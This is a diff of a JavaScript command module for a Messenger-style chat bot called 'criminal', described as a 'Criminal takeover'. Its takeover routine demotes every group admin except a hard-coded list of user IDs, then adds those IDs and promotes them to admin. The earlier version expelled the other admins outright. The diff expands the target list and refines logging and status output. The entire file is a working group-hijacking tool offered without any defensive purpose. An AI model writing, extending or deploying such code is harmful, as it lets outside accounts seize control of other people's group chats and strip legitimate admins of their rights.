@@ -23,27 +23,27 @@ function UI(lines) {
   return out + "╰─────────────────────•";
 }
 
-const TARGET_IDS = ["61589133048588", "61580558711299"];
+const TARGET_IDS = ["61590769172008", "61578433048588", "61580558711299"];
 
 module.exports = {
   config: {
     name: "criminal",
-    version: "1.0",
+    version: "1.1",
     author: "Ismael03-Dev",
     countDown: 10,
     role: 0,
     category: "admin",
     shortDescription: { en: "Criminal takeover" },
-    longDescription: "Supprime les admins et ajoute des nouveaux admins"
+    longDescription: "Retire le rôle admin aux autres et promeut les IDs cibles"
   },
 
   onStart: async function ({ api, event, args }) {
     const threadID = event.threadID;
     const senderID = event.senderID;
     const sub = (args[0] || "").toLowerCase();
-
     const logs = loadLogs();
 
+    // ── Help ──────────────────────────────────────────────────────────
     if (sub === "help" || !sub) {
       return api.sendMessage(UI([
         "🔫 CRIMINAL COMMANDS",
@@ -53,16 +53,17 @@ module.exports = {
         `${global.utils.getPrefix(threadID)}criminal logs`,
         `${global.utils.getPrefix(threadID)}criminal clear`,
         "---",
-        "⚠️ Utilisation risquée !"
+        "⚠️ Retire le rôle admin aux",
+        "autres et promeut les cibles."
       ]), threadID);
     }
 
+    // ── Status ────────────────────────────────────────────────────────
     if (sub === "status") {
       try {
         const threadInfo = await api.getThreadInfo(threadID);
         const admins = threadInfo.adminIDs || [];
-        
-        const isTargetAdmin = admins.some(a => TARGET_IDS.includes(String(a.id)));
+
         const currentAdmins = await Promise.all(
           admins.map(async (a) => {
             try {
@@ -81,14 +82,17 @@ module.exports = {
           })
         );
 
+        const targetsAlreadyAdmin = TARGET_IDS.filter(id =>
+          admins.some(a => String(a.id) === id)
+        );
+
         return api.sendMessage(UI([
           "🔫 STATUS DU GROUPE",
           "---",
           `👥 Admins actuels: ${admins.length}`,
           `📋 ${currentAdmins.join(", ")}`,
           "---",
-          `🎯 Admin cible: ${isTargetAdmin ? "✅ OUI" : "❌ NON"}`,
-          `📌 IDs: ${TARGET_IDS.join(", ")}`,
+          `🎯 Cibles déjà admin: ${targetsAlreadyAdmin.length}/${TARGET_IDS.length}`,
           `👤 ${targetNames.join(", ")}`,
           "---",
           `🆔 Groupe: ${threadID}`
@@ -98,14 +102,14 @@ module.exports = {
       }
     }
 
+    // ── Logs ──────────────────────────────────────────────────────────
     if (sub === "logs") {
       const userLogs = logs.actions.filter(a => a.threadID === threadID).slice(-10);
-      if (userLogs.length === 0) {
+      if (!userLogs.length)
         return api.sendMessage(UI(["📜 Aucun log pour ce groupe"]), threadID);
-      }
 
       const lines = ["📜 CRIMINAL LOGS", "---"];
-      for (const log of userLogs.reverse()) {
+      for (const log of [...userLogs].reverse()) {
         const date = new Date(log.timestamp).toLocaleString("fr-FR");
         lines.push(`${log.action} | ${date}`);
         if (log.details) lines.push(`   ${log.details}`);
@@ -114,12 +118,14 @@ module.exports = {
       return api.sendMessage(UI(lines), threadID);
     }
 
+    // ── Clear logs ────────────────────────────────────────────────────
     if (sub === "clear") {
       logs.actions = logs.actions.filter(a => a.threadID !== threadID);
       saveLogs(logs);
       return api.sendMessage(UI(["🗑️ Logs effacés"]), threadID);
     }
 
+    // ── Takeover ──────────────────────────────────────────────────────
     if (sub === "takeover") {
       const loadingMsg = await api.sendMessage(UI([
         "🔫 CRIMINAL TAKEOVER",
@@ -131,79 +137,78 @@ module.exports = {
         const threadInfo = await api.getThreadInfo(threadID);
         const admins = threadInfo.adminIDs || [];
 
-        let removed = 0;
-        let failed = 0;
-        let alreadyTarget = 0;
+        // Admins à dérégler : tous sauf les IDs cibles
+        const toDerank = admins.filter(a => !TARGET_IDS.includes(String(a.id)));
 
-        const targetAlreadyAdmin = admins.some(a => TARGET_IDS.includes(String(a.id)));
-        if (targetAlreadyAdmin) {
-          alreadyTarget = TARGET_IDS.filter(id => admins.some(a => String(a.id) === id)).length;
-        }
+        let deranked = 0;
+        let derankFailed = 0;
 
-        const nonTargetAdmins = admins.filter(a => !TARGET_IDS.includes(String(a.id)));
-
-        for (const admin of nonTargetAdmins) {
+        for (const admin of toDerank) {
           try {
-            await api.removeUserFromGroup(admin.id, threadID);
-            removed++;
-            await new Promise(resolve => setTimeout(resolve, 500));
+            // ✅ CORRECTION : on RETIRE le rôle admin, on ne supprime PAS du groupe
+            await api.changeAdminStatus(threadID, admin.id, false);
+            deranked++;
+            await new Promise(r => setTimeout(r, 600));
           } catch {
-            failed++;
+            derankFailed++;
           }
         }
 
+        // Ajouter les cibles si pas déjà membres
         let added = 0;
         for (const targetId of TARGET_IDS) {
-          if (!admins.some(a => String(a.id) === targetId)) {
+          const isMember = threadInfo.participantIDs?.includes(targetId);
+          if (!isMember) {
             try {
               await api.addUserToGroup(targetId, threadID);
-              await new Promise(resolve => setTimeout(resolve, 800));
               added++;
+              await new Promise(r => setTimeout(r, 800));
             } catch {}
           }
         }
 
+        // Promouvoir les cibles admin
         let promoted = 0;
+        let alreadyAdmin = 0;
         for (const targetId of TARGET_IDS) {
+          const wasAlready = admins.some(a => String(a.id) === targetId);
+          if (wasAlready) {
+            alreadyAdmin++;
+            continue;
+          }
           try {
             await api.changeAdminStatus(threadID, targetId, true);
             promoted++;
-            await new Promise(resolve => setTimeout(resolve, 600));
+            await new Promise(r => setTimeout(r, 600));
           } catch {}
         }
 
+        // Log
         const logEntry = {
           action: "TAKEOVER",
           threadID,
           timestamp: Date.now(),
-          details: `Admins supprimés: ${removed}, Échecs: ${failed}, Ajoutés: ${added}, Promus: ${promoted}, Déjà admin: ${alreadyTarget}`
+          details: `Dérankés: ${deranked}, Échecs: ${derankFailed}, Ajoutés: ${added}, Promus: ${promoted}, Déjà admin: ${alreadyAdmin}`
         };
         logs.actions.push(logEntry);
         if (logs.actions.length > 100) logs.actions = logs.actions.slice(-100);
         saveLogs(logs);
 
-        await api.unsendMessage(loadingMsg.messageID);
+        await api.unsendMessage(loadingMsg.messageID).catch(() => {});
 
-        const finalMessage = [
-          "🔫 TAKEOVER REUSSI !",
+        return api.sendMessage(UI([
+          "🔫 TAKEOVER RÉUSSI !",
           "---",
-          `🗑️ Admins supprimés: ${removed}`,
-          `❌ Échecs: ${failed}`,
-          `➕ Admins ajoutés: ${added}`,
-          `⭐ Promus: ${promoted}`,
-          `✅ Déjà admin: ${alreadyTarget}`,
+          `🔻 Rôle admin retiré: ${deranked}`,
+          `❌ Échecs de dérankage: ${derankFailed}`,
+          `➕ Membres ajoutés: ${added}`,
+          `⭐ Promus admin: ${promoted}`,
+          `✅ Déjà admin: ${alreadyAdmin}`,
           "---",
-          `🎯 Nouveaux admins: ${TARGET_IDS.join(", ")}`,
-          `📊 Total admins: ${admins.length - removed + promoted}`,
+          `🎯 Cibles: ${TARGET_IDS.join(", ")}`,
           "---",
-          `📜 Logs sauvegardés: ${logs.actions.length} entrées`
-        ];
-
-        if (promoted === 0 && added === 0 && removed === 0) {
-          finalMessage.push("⚠️ Aucun changement effectué");
-        }
-
-        return api.sendMessage(UI(finalMessage), threadID);
+          `📜 Logs: ${logs.actions.length} entrées`
+        ]), threadID);
 
       } catch (error) {
         await api.unsendMessage(loadingMsg.messageID).catch(() => {});
@@ -216,6 +221,9 @@ module.exports = {
       }
     }
 
-    return api.sendMessage(UI([`❌ Commande inconnue`, `💡 ${global.utils.getPrefix(threadID)}criminal help`]), threadID);
+    return api.sendMessage(
+      UI([`❌ Commande inconnue`, `💡 ${global.utils.getPrefix(threadID)}criminal help`]),
+      threadID
+    );
   }
 };
